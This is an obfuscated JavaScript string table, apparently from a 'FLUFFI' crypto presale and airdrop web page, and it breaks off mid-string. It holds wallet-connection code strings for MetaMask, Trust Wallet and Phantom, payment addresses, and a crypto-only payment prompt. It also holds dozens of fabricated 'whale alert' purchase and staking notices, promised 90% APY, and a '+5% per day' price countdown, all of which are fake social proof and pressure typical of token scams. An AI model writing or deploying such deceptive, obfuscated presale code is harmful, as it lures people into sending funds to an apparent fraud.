_0x45ef7f=['Card\x20payments\x20coming\x20soon!\x20Please\x20use\x20crypto\x20for\x20now.','🐋\x20User\x200xt1u...2v3\x20purchased\x200.92\x20ETH\x20of\x20FLUFFI','Too\x20many\x20attempts.\x20Please\x20wait.','innerHTML','Unsupported\x20network\x20selected.','cursor-not-allowed','🔥\x20User0x9F4\x20staked\x2045,000\x20FLUFFI\x20and\x20is\x20earning\x2090%\x20APY!','trust://','5,432','🚀\x20User\x200xo7p...8q9\x20joined\x20FLUFFI\x20presale\x20with\x201.5\x20AVAX','Price\x20not\x20available\x20for\x20','🐋\x20User\x200xgt9...0v1\x20purchased\x2028.7\x20AVAX\x20of\x20FLUFFI\x20tokens','\x20<span\x20class=\x22price-tooltip\x22><i\x20class=\x22fas\x20fa-info-circle\x20text-blue-500\x22></i><span\x20class=\x22tooltip-text\x22><strong>Price\x20Increase:</strong><br>+5%\x20per\x20day<br>Next\x20increase:\x20<span\x20id=\x22nextIncreaseTime\x22>00h\x2000m\x2000s</span></span></span>','ETHUSDT','🐋\x20User\x200xer3...4t5\x20just\x20bought\x200.8\x20ETH\x20worth\x20of\x20FLUFFI','Using\x20','rgba(15,\x2023,\x2042,\x200.9)','metamask','tooltip','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22help-title\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22help-icon-wrapper\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-shield-alt\x20help-icon\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span>Trust\x20Wallet\x20Connection\x20Guide</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22help-platform\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22platform-header\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22platform-icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-desktop\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Browser\x20Instructions</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ol\x20class=\x22help-steps\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Install\x20Trust\x20Wallet\x20extension\x20for\x20your\x20browser</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Set\x20up\x20your\x20wallet\x20and\x20secure\x20your\x20recovery\x20phrase</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Click\x20\x22Connect\x20Wallet\x22\x20and\x20select\x20Trust\x20Wallet</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Approve\x20the\x20connection\x20request\x20in\x20the\x20extension</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Your\x20wallet\x20will\x20be\x20connected\x20to\x20our\x20dApp</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</ol>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22help-platform\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22platform-header\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22platform-icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-mobile-alt\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Mobile\x20Instructions</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ol\x20class=\x22help-steps\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Install\x20Trust\x20Wallet\x20from\x20App\x20Store\x20or\x20Play\x20Store</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Open\x20our\x20website\x20in\x20Trust\x20Wallet\x27s\x20DApp\x20browser</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Tap\x20\x22Connect\x20Wallet\x22\x20and\x20select\x20Trust\x20Wallet</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Approve\x20the\x20connection\x20request\x20in\x20the\x20app</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>For\x20WalletConnect,\x20scan\x20the\x20QR\x20code\x20from\x20mobile</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</ol>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20','includes','Solana\x20transaction\x20failed:\x20','referralSection','children','\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22text-center\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22text-6xl\x20mb-4\x22>🎉</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20class=\x22text-3xl\x20font-bold\x20text-green-600\x20dark:text-green-400\x20mb-4\x22>Purchase\x20Successful!</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22bg-green-50\x20dark:bg-green-900/20\x20p-6\x20rounded-xl\x20mb-6\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text-sm\x20text-gray-600\x20dark:text-gray-300\x20mb-2\x22>You\x20bought</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text-4xl\x20font-bold\x20text-green-600\x20dark:text-green-400\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','open','rpcUrl','https://bridge.walletconnect.org','tg-count','scrollIntoView','Phantom\x20wallet\x20reconnected\x20silently','copy','createSession','tokens','Converting\x20to\x20','🐋\x20WHALE\x20ALERT!\x20User\x200xqxb7...8c9\x20invested\x2013.5\x20BNB\x20in\x20FLUFFI','Please\x20install\x20MetaMask\x20extension','🔥\x20User\x200xx4y...5z6\x20bought\x206.9\x20BNB\x20worth\x20of\x20FLUFFI\x20tokens','Marketing\x20(5%)','🐋\x20User\x200xd4e...5f6\x20just\x20bought\x208.5\x20BNB\x20worth\x20of\x20FLUFFI','days','</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text-sm\x22>','FUND_WALLET','💰\x20User\x200xzw6...7x8\x20received\x205,200\x20FLUFFI\x20in\x20referral\x20rewards','b74a733c47def7b6672eb9ad072c4e8a','MetaMask\x20connection\x20error:','darkMode','0x...','replace','stakedBalances','querySelector','metamask://','phantom','https://fluffi.io/airdrop?ref=','substring','https://phantom.app/','MATICUSDT','onerror','presale-hours','🚀\x20User0x8F6\x20joined\x20with\x200.25\x20ETH\x20in\x20presale!','5147640KQhnKX','stakedBalance','estimateGas','BpP6hRn1JReh3YVQgLQdH4kPTLUt4nty1PmXNN7rARfZ','Presale\x20hasn\x27t\x20ended\x20yet.\x20','.notification-toast','helpContent','\x0a\x20\x20\x20\x20/*\x20Custom\x20sway\x20animation\x20for\x20the\x20scales\x20icon\x20*/\x0a\x20\x20\x20\x20@keyframes\x20sway\x20{\x0a\x20\x20\x20\x20\x20\x200%\x20{\x20transform:\x20translateX(0);\x20}\x0a\x20\x20\x20\x20\x20\x2025%\x20{\x20transform:\x20translateX(5px);\x20}\x0a\x20\x20\x20\x20\x20\x2075%\x20{\x20transform:\x20translateX(-5px);\x20}\x0a\x20\x20\x20\x20\x20\x20100%\x20{\x20transform:\x20translateX(0);\x20}\x0a\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20.animate-sway\x20{\x0a\x20\x20\x20\x20\x20\x20animation:\x20sway\x202s\x20infinite\x20ease-in-out;\x0a\x20\x20\x20\x20\x20\x20display:\x20inline-block;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20.network-indicator\x20{\x0a\x20\x20\x20\x20\x20\x20position:\x20fixed;\x0a\x20\x20\x20\x20\x20\x20bottom:\x2010px;\x0a\x20\x20\x20\x20\x20\x20right:\x2010px;\x0a\x20\x20\x20\x20\x20\x20background:\x20#10B981;\x0a\x20\x20\x20\x20\x20\x20color:\x20white;\x0a\x20\x20\x20\x20\x20\x20padding:\x205px\x2010px;\x0a\x20\x20\x20\x20\x20\x20border-radius:\x2010px;\x0a\x20\x20\x20\x20\x20\x20font-size:\x2012px;\x0a\x20\x20\x20\x20\x20\x20z-index:\x201000;\x0a\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20.trust-card\x20img\x20{\x0a\x20\x20\x20\x20\x20\x20filter:\x20drop-shadow(0\x204px\x2010px\x20rgba(0,0,0,0.1));\x0a\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20/*\x20Animations\x20*/\x0a\x20\x20\x20\x20@keyframes\x20bounce\x20{\x200%,\x20100%\x20{\x20transform:\x20translateY(0);\x20}\x2050%\x20{\x20transform:\x20translateY(-10px);\x20}\x20}\x0a\x20\x20\x20\x20.animate-bounce\x20{\x20animation:\x20bounce\x202s\x20infinite;\x20}\x0a\x0a\x20\x20\x20\x20@keyframes\x20pulse\x20{\x200%,\x20100%\x20{\x20transform:\x20scale(1);\x20}\x2050%\x20{\x20transform:\x20scale(1.05);\x20}\x20}\x0a\x20\x20\x20\x20.animate-pulse\x20{\x20animation:\x20pulse\x202s\x20infinite;\x20}\x0a\x0a\x20\x20\x20\x20@keyframes\x20sway\x20{\x200%\x20{\x20transform:\x20translateX(0);}\x2050%\x20{\x20transform:\x20translateX(5px);}\x20100%\x20{\x20transform:\x20translateX(0);}\x20}\x0a\x20\x20\x20\x20.animate-sway\x20{\x20animation:\x20sway\x203s\x20infinite\x20ease-in-out;\x20}\x0a\x0a\x20\x20\x20\x20/*\x20Dark\x20mode\x20specific\x20fixes\x20*/\x0a\x20\x20\x20\x20.dark\x20.trust-card\x20{\x0a\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20rgba(255,\x20255,\x20255,\x200.1);\x0a\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20.dark\x20.trust-card\x20h3\x20{\x0a\x20\x20\x20\x20\x20\x20color:\x20#f9fafb\x20!important;\x20/*\x20gray-50\x20*/\x0a\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20.dark\x20.trust-card\x20p\x20{\x0a\x20\x20\x20\x20\x20\x20color:\x20#d1d5db\x20!important;\x20/*\x20gray-300\x20*/\x0a\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20/*\x20Marquee\x20scrolling\x20effect\x20-\x20FIXED\x20FOR\x2050\x20ITEMS\x20*/\x0a\x20\x20\x20\x20@keyframes\x20marquee\x20{\x0a\x20\x20\x20\x20\x20\x200%\x20\x20\x20{\x20transform:\x20translateX(100%);\x20}\x0a\x20\x20\x20\x20\x20\x20100%\x20{\x20transform:\x20translateX(-100%);\x20}\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.animate-marquee\x20{\x0a\x20\x20\x20\x20\x20\x20display:\x20inline-block;\x0a\x20\x20\x20\x20\x20\x20animation:\x20marquee\x20150s\x20linear\x20infinite;\x20/*\x20Changed\x20from\x2020s\x20to\x20150s\x20for\x2050\x20items\x20*/\x0a\x20\x20\x20\x20\x20\x20white-space:\x20nowrap;\x0a\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20/*\x20Improved\x20marquee\x20container\x20*/\x0a\x20\x20\x20\x20.marquee-container\x20{\x0a\x20\x20\x20\x20\x20\x20width:\x20100%;\x0a\x20\x20\x20\x20\x20\x20overflow:\x20hidden;\x0a\x20\x20\x20\x20\x20\x20position:\x20relative;\x0a\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20/*\x20Pause\x20on\x20hover\x20for\x20better\x20readability\x20*/\x0a\x20\x20\x20\x20.animate-marquee:hover\x20{\x0a\x20\x20\x20\x20\x20\x20animation-play-state:\x20paused;\x0a\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20/*\x20Dark\x20mode\x20fixes\x20for\x20community\x20activity\x20*/\x0a\x20\x20\x20\x20.dark\x20#community-activity\x20{\x0a\x20\x20\x20\x20\x20\x20background-color:\x20#1f2937;\x20/*\x20gray-800\x20*/\x0a\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20.dark\x20#liveFeed\x20{\x0a\x20\x20\x20\x20\x20\x20background-color:\x20#374151;\x20/*\x20gray-700\x20*/\x0a\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#4b5563;\x20/*\x20gray-600\x20*/\x0a\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20/*\x20Live\x20feed\x20animations\x20-\x20slowed\x20down\x20*/\x0a\x20\x20\x20\x20@keyframes\x20fadeIn\x20{\x0a\x20\x20\x20\x20\x20\x20from\x20{\x20opacity:\x200;\x20transform:\x20translateY(10px);\x20}\x0a\x20\x20\x20\x20\x20\x20to\x20{\x20opacity:\x201;\x20transform:\x20translateY(0);\x20}\x0a\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20.animate-fade-in\x20{\x0a\x20\x20\x20\x20\x20\x20animation:\x20fadeIn\x200.8s\x20ease-in;\x20/*\x20Slightly\x20slower\x20fade\x20*/\x0a\x20\x20\x20\x20}\x0a\x20\x20','.\x20Please\x20switch\x20to\x20a\x20supported\x20network.','Solana\x20network\x20selected.\x20Please\x20connect\x20a\x20Solana\x20wallet\x20like\x20Phantom.','BNBUSDT','token','🔥\x20User0x118\x20staked\x201,000,000\x20FLUFFI\x20for\x20mega\x20rewards!','https://data-seed-prebsc-1-s1.binance.org:8545/','/.netlify/functions/record-purchase','network-indicator','</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text-xs\x22>DAYS</p>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20<div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text-3xl\x20font-bold\x22>','&text=Join%20$FLUFFI%20presale!%20🚀%20Use%20my%20referral%20link%20for%20bonus%20tokens','\x20FLUFFI\x20tokens','getRecentBlockhash','body','🐋\x20User0xBB1\x20just\x20bought\x205.6\x20BNB\x20worth\x20of\x20FLUFFI\x20🚀','value','🐋\x20User0x40E\x20just\x20bought\x207.1\x20BNB\x20worth\x20of\x20FLUFFI\x20🚀','accounts','Trust\x20Wallet','#3B82F6','parse','Chain\x20','removeChild','select','stakeTokens','current-stage','stringify','startDistribution','totalTokensSold','https://api.binance.com/api/v3/ticker/price?symbol=','🐋\x20User\x200xi9j...0k1\x20purchased\x2018.2\x20BNB\x20of\x20FLUFFI\x20tokens','LAMPORTS_PER_SOL','bodyColor','buyTokens','_tokenAddress','Invalid\x20referral\x20address','\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22fixed\x20top-20\x20right-4\x20z-50\x20animate-slide-in\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22','🚀\x20User\x200xe5f...6g7\x20joined\x20with\x200.15\x20ETH\x20in\x20presale!','getElementById','from','Web3Provider','presaleStartTime','push','Converting\x20','selectedIndex','address','matchMedia','parentNode','confirmTransaction','https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js','getSigner','🐋\x20User\x200x7g8...9h0\x20purchased\x2025.8\x20AVAX\x20of\x20FLUFFI\x20tokens','wallet_switchEthereumChain','connect','🔥\x20User\x200xw4x...5y6\x20bought\x202.3\x20ETH\x20worth\x20of\x20FLUFFI\x20tokens','providers','Failed\x20to\x20connect\x20Trust\x20Wallet','info','stageProgressBar','min','slice','0xcD1CB9969F678c7b1CB8805bC49F273725910832','Transaction\x20failed','accountChanged','https://bscscan.com','https://link.trustwallet.com','🔥\x20User0x47C\x20staked\x2085,000\x20FLUFFI\x20and\x20is\x20compounding\x20daily!','walletConnectQrCode','🔥\x20User0x6C4\x20staked\x2075,000\x20FLUFFI\x20and\x20is\x20earning\x20daily\x20rewards!','presale-seconds','floor','disconnect','RewardsClaimed','0xAA36A7','Presale\x20contract\x20not\x20deployed\x20on\x20this\x20network','You\x20will\x20receive\x20','substr','presale-days','getItem','split','get','amountInput','Wallet\x20disconnected','position:\x20fixed;\x20bottom:\x2010px;\x20right:\x2010px;\x20background:\x20#10B981;\x20color:\x20white;\x20padding:\x205px\x2010px;\x20border-radius:\x2010px;\x20font-size:\x2012px;\x20z-index:\x201000;','eth_requestAccounts','feed-list','#10B981','0x61','1328912BfeLAD','chainName','endTime','hours','purchasedBalance','0xA869','Claim\x20error:','Phantom\x20connection\x20error:','Failed\x20to\x20connect\x20Phantom\x20wallet:\x20','Error\x20getting\x20contract:','🔥\x20User\x200xi1j...2k3\x20bought\x208.7\x20AVAX\x20worth\x20of\x20FLUFFI','undefined','\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22space-y-4\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<label\x20class=\x22block\x20mb-2\x20font-semibold\x22>Your\x20referral\x20link:</label>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22flex\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\x22text\x22\x20id=\x22referralLinkInput\x22\x20value=\x22','presale_','toLowerCase','10VefROm','https://sepolia.infura.io/v3/YOUR_INFURA_ID','eth_chainId','bg-blue-500','🔥\x20User0xE77\x20staked\x2060,000\x20FLUFFI\x20and\x20is\x20locked\x20till\x20listing!','FLUFFI\x20price:\x20$','QR\x20code\x20generation\x20error:','walletModal','src','Solana\x20Mainnet','seconds','https://twitter.com/intent/tweet?text=Join%20$FLUFFI%20presale!%20🚀%20Use%20my%20referral%20link%20for%20bonus%20tokens:%20','Network\x20switch\x20error:','🐋\x20User\x200xkb1...2c3\x20purchased\x200.15\x20ETH\x20of\x20FLUFFI','Ethereum\x20Mainnet','189iUlOeN','tokenChart','🎉\x20Purchase\x20successful!\x20TX:\x20','style','Amount\x20in\x20USD:\x20$','walletconnect','Error\x20fetching\x20crypto\x20price:','(prefers-color-scheme:\x20dark)','refInput','Failed\x20to\x20add\x20network.\x20Please\x20add\x20it\x20manually\x20in\x20your\x20wallet.','createElement','cost','\x0a\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20.wallet-connect-fallback\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20.fallback-title\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2018px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20bold;\x0a\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2015px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#1f2937;\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20.dark\x20.fallback-title\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#f9fafb;\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20.wallet-grid\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20display:\x20grid;\x0a\x20\x20\x20\x20\x20\x20\x20\x20grid-template-columns:\x201fr\x201fr;\x0a\x20\x20\x20\x20\x20\x20\x20\x20gap:\x2012px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2020px;\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20.wallet-option-card\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20flex-direction:\x20column;\x0a\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2015px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#f8fafc;\x0a\x20\x20\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#e2e8f0;\x0a\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2012px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20cursor:\x20pointer;\x0a\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20all\x200.2s;\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20.dark\x20.wallet-option-card\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#374151;\x0a\x20\x20\x20\x20\x20\x20\x20\x20border-color:\x20#4b5563;\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20.wallet-option-card:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#e2e8f0;\x0a\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translateY(-2px);\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20.dark\x20.wallet-option-card:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#4b5563;\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20.wallet-icon\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20width:\x2040px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20height:\x2040px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x208px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20object-fit:\x20contain;\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20.wallet-name\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20600;\x0a\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2014px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#1f2937;\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20.dark\x20.wallet-name\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#f9fafb;\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20.wallet-description\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2012px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#6b7280;\x0a\x20\x20\x20\x20\x20\x20\x20\x20margin-top:\x204px;\x0a\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20</style>\x0a\x0a\x20\x20\x20\x20<button\x20class=\x22modal-close-btn\x22\x20onclick=\x22closeWalletConnectModal()\x22>×</button>\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20<div\x20class=\x22wallet-connect-fallback\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22fallback-title\x22>Choose\x20Your\x20Wallet</div>\x0a\x20\x20\x20\x20\x20\x20<p\x20style=\x22color:\x20#6b7280;\x20margin-bottom:\x2020px;\x20font-size:\x2014px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20Select\x20a\x20wallet\x20to\x20connect\x20to\x20$FLUFFI\x20Airdrop\x0a\x20\x20\x20\x20\x20\x20</p>\x0a\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22wallet-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22wallet-option-card\x22\x20onclick=\x22connectMetaMask()\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg\x22\x20alt=\x22MetaMask\x22\x20class=\x22wallet-icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22wallet-name\x22>MetaMask</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22wallet-description\x22>Browser\x20&\x20Mobile</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22wallet-option-card\x22\x20onclick=\x22connectTrustWallet()\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22Trust_Stacked\x20Logo_Blue.png\x22\x20alt=\x22Trust\x20Wallet\x22\x20class=\x22wallet-icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22wallet-name\x22>Trust\x20Wallet</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22wallet-description\x22>Mobile</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22wallet-option-card\x22\x20onclick=\x22connectBinanceWallet()\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22binance.png\x22\x20alt=\x22Binance\x22\x20class=\x22wallet-icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22wallet-name\x22>Binance\x20Wallet</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22wallet-description\x22>Browser\x20&\x20Mobile</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22wallet-option-card\x22\x20onclick=\x22window.open(\x27https://rainbow.me/\x27,\x20\x27_blank\x27)\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22wallet-icon\x22\x20style=\x22background:\x20linear-gradient(45deg,\x20#FF6B6B,\x20#4ECDC4,\x20#45B7D1,\x20#96CEB4);\x20display:\x20flex;\x20align-items:\x20center;\x20justify-content:\x20center;\x20color:\x20white;\x20font-weight:\x20bold;\x20font-size:\x2016px;\x22>🌈</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22wallet-name\x22>Rainbow</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22wallet-description\x22>Mobile</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22wallet-option-card\x22\x20onclick=\x22window.open(\x27https://argent.xyz/\x27,\x20\x27_blank\x27)\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22wallet-icon\x22\x20style=\x22background:\x20#FF875B;\x20display:\x20flex;\x20align-items:\x20center;\x20justify-content:\x20center;\x20color:\x20white;\x20font-weight:\x20bold;\x20font-size:\x2014px;\x22>A</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22wallet-name\x22>Argent</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22wallet-description\x22>Mobile</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22wallet-option-card\x22\x20onclick=\x22connectPhantom()\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22Phantom-Icon_App_1200x1200.png\x22\x20alt=\x22Phantom\x22\x20class=\x22wallet-icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22wallet-name\x22>Phantom</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20<button\x20onclick=\x22closeWalletConnectModal()\x22\x20style=\x22margin-top:\x2015px;\x20padding:\x2010px\x2020px;\x20background:\x20#6b72